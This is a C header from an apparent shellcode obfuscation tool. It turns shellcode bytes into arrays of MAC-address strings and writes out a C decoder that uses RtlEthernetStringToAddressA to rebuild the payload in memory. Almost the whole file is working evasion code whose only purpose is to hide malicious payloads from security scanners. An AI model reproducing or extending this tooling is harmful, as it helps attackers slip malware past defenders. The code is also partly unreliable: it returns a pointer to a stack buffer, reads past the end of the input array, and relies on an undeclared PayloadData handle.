#pragma once
#include <Windows.h>
#include <stdio.h>

typedef unsigned long long uint64_t;


//-------------------------------------------------------------------------------------------------------------------------------------------------------------------------//
// genearte the mac representation of the shellcode[i]
const char* GenerateMAC(uint64_t MAC) {
	unsigned char bytes[6];
	char Output[64];
	bytes[0] = MAC & 0xFF;
	bytes[1] = (MAC >> 8) & 0xFF;
	bytes[2] = (MAC >> 16) & 0xFF;
	bytes[3] = (MAC >> 24) & 0xFF;
	bytes[4] = (MAC >> 32) & 0xFF;
	bytes[5] = (MAC >> 40) & 0xFF;
	//printf( "%d-%d-%d-%d-%d-%d \n", bytes[5], bytes[4], bytes[3], bytes[2], bytes[1], bytes[0]);
	sprintf(Output, "%0.2X-%0.2X-%0.2X-%0.2X-%0.2X-%0.2X", (bytes[5]), (bytes[4]), (bytes[3]), (bytes[2]), (bytes[1]), (bytes[0]));
	return (const char*)Output;
}

//-------------------------------------------------------------------------------------------------------------------------------------------------------------------------//
// generate the hex mac representation of the shellcode[i]
uint64_t GenerateMacHex(int a, int b, int c, int d, int e, int f) {
	uint64_t result = ((uint64_t)a << 40) | ((uint64_t)b << 32) | ((uint64_t)c << 24) | ((uint64_t)d << 16) | ((uint64_t)e << 8) | f;
	//printf("[i] result: 0x%llX \n", result);
	return result;
}


//-------------------------------------------------------------------------------------------------------------------------------------------------------------------------//
// generate the mac output representation of the shellcode
void GenerateMacOutput(SIZE_T ShellcodeSize, unsigned char* FinallShell, PBOOL Success) {
	if (!*Success) {
		return;
	}
	char WriteHeader[256] = "#include <Windows.h>\n#include <stdio.h>\n#include <Ip2string.h>\n#pragma comment(lib, \"Ntdll.lib\")\n\n#ifndef NT_SUCCESS\n#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)\n#endif\n";
	char WriteConfig[128], CharMAC[128];
	char WriteDecoderFunc[1024] = "BOOL DecodeMACFuscation(const char* MAC[], PVOID LpBaseAddress) {\n\tPCSTR Terminator = NULL;\n\tPVOID LpBaseAddress2 = NULL;\n\tNTSTATUS STATUS;\n\tint i = 0;\n\tfor (int j = 0; j < ElementsNumber; j++) {\n\t\tLpBaseAddress2 = PVOID((ULONG_PTR)LpBaseAddress + i);\n\t\tSTATUS = RtlEthernetStringToAddressA((PCSTR)MAC[j], &Terminator, (DL_EUI48*)LpBaseAddress2);\n\t\tif (!NT_SUCCESS(STATUS)) {\n\t\t\tprintf(\"[!] RtlEthernetStringToAddressA failed for %s result %x\", MAC[j], STATUS);\n\t\t\treturn FALSE;\n\t\t}\n\t\telse {\n\t\t\ti = i + 6;\n\t\t}\n\t}\n\treturn TRUE;\n}\n";
	WriteFile(PayloadData.hFile, WriteHeader, strlen(WriteHeader), NULL, NULL);
	WriteFile(PayloadData.hFile, "\nconst char * MACShell [] = { \n\t", strlen("\nconst char * MACShell [] = { \n\t"), NULL, NULL);
	int c = 6, C = 0;
	uint64_t HexVal;
	const char* Mac = NULL;
	for (int i = 0; i <= ShellcodeSize; i++) {
		if (c == 6) {
			C++;
			HexVal = GenerateMacHex(FinallShell[i], FinallShell[i + 1], FinallShell[i + 2], FinallShell[i + 3], FinallShell[i + 4], FinallShell[i + 5]);
			Mac = GenerateMAC(HexVal);
			if (i == ShellcodeSize - 6) {
				sprintf(CharMAC, "\"%s\"", Mac);
				WriteFile(PayloadData.hFile, CharMAC, strlen(CharMAC), NULL, NULL);
				break;
			}
			else {
				sprintf(CharMAC, "\"%s\", ", Mac);
				WriteFile(PayloadData.hFile, CharMAC, strlen(CharMAC), NULL, NULL);
			}
			c = 1;
			if (C % 8 == 0) {
				WriteFile(PayloadData.hFile, "\n\t", strlen("\n\t"), NULL, NULL);
			}
		}
		else {
			c++;
		}
	}
	
	WriteFile(PayloadData.hFile, "\n};\n", strlen("\n};\n"), NULL, NULL);
	sprintf(WriteConfig, "#define ElementsNumber %d\n#define SizeOfShellcode %d\n\n", C, (unsigned int)ShellcodeSize);
	WriteFile(PayloadData.hFile, WriteConfig, strlen(WriteConfig), NULL, NULL);
	WriteFile(PayloadData.hFile, WriteDecoderFunc, strlen(WriteDecoderFunc), NULL, NULL);
	CloseHandle(PayloadData.hFile);
	*Success = TRUE;
}
//-------------------------------------------------------------------------------------------------------------------------------------------------------------------------//
// print shellcode to the screen directly 

/*
void GenerateMacOutput(SIZE_T ShellcodeSize, unsigned char* FinallShell, PBOOL Success) {
	if (!*Success) {
		return;
	}
	printf("\nconst char * MACShell [] = { \n\t");
	int c = 6, C = 0;
	uint64_t HexVal;
	const char* Mac = NULL;
	for (int i = 0; i <= ShellcodeSize; i++) {
		if (c == 6) {
			C++;
			HexVal = GenerateMacHex(FinallShell[i], FinallShell[i + 1], FinallShell[i + 2], FinallShell[i + 3], FinallShell[i + 4], FinallShell[i + 5]);
			Mac = GenerateMAC(HexVal);
			if (i == ShellcodeSize - 6) {
				printf("\"%s\"", Mac);
				break;
			}
			else {
				printf("\"%s\", ", Mac);
			}
			c = 1;
			if (C % 8 == 0) {
				printf("\n\t");
			}
		}
		else {
			c++;
		}
	}
	printf("\n};\n");
	printf("#define ElementsNumber %d\n", C);
	printf("#define SizeOfShellcode %d\n", (unsigned int)ShellcodeSize);
	*Success = TRUE;
}
*/